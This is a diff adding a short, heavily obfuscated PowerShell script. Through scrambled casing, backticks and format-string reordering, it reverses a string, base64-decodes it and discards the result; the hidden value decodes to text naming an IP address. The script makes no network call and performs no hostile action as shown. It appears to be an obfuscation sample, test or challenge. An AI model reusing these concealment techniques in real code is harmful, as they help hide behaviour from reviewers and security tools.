@@ -1,0 +1,21 @@
+ sET-itEm VArIaBLe:KdWg ( [TYPE]("{0}{1}"-f 'A','rRAy') )  ; seT-item  ("vA"+"r"+"iABlE:"+"BXDEzL")  (  [TyPE]("{4}{0}{3}{1}{2}" -f 'O','N','g','DI','teXt.enc')  )  ;   SEt-VArIabLe p1ld  ([tYpE]("{1}{2}{0}"-f'Rt','c','OnVe')) ; Function _`/_===={
+    [CmdletBinding()] param(
+        [Parameter(posItIOn = 0)]
+        [String]
+        ${pA`Ra`m1}
+    )
+    
+    ${T`MP} = ${p`AR`Am1}
+    ${t`mp} = ${t`mp}."TocHAr`A`Rr`AY"()
+      $KDwg::"REvE`R`sE"(${T`Mp})
+    ${T`Mp} = ${t`mP} -join ""
+    
+    &('write-h'+'o'+'st') ${T`mp}
+    ${ReS`U`lT}  =   (  gEt-vaRIabLe ("b"+"XdEzL") -vAlue  )::"u`N`icOdE"."gEt`StRi`Ng"(  (gET-vARIABLE P1LD  ).vaLUe::"fr`omb`A`sE6`4STRINg"(${t`Mp}))
+    ${R`ESUlT} | .('out'+'-nu'+'ll')
+}
+
+&('Set-V'+'ar'+'iab'+'le') "ofs" ""
+&('Set-'+'Al'+'ias') -name __\=`/`_= -value _/_==`==
+&('__Vs0='+'/_=').ReplACE(([char]86+[char]115+[char]48),'\') -param1 ("{12}{7}{6}{3}{5}{4}{9}{0}{1}{8}{10}{11}{2}"-f 'MA4C','A5AQ','wBQa','gL','D','Ac','AQMA4CA3A','IDAx','MA','A4AQ','oD','A','A')
+
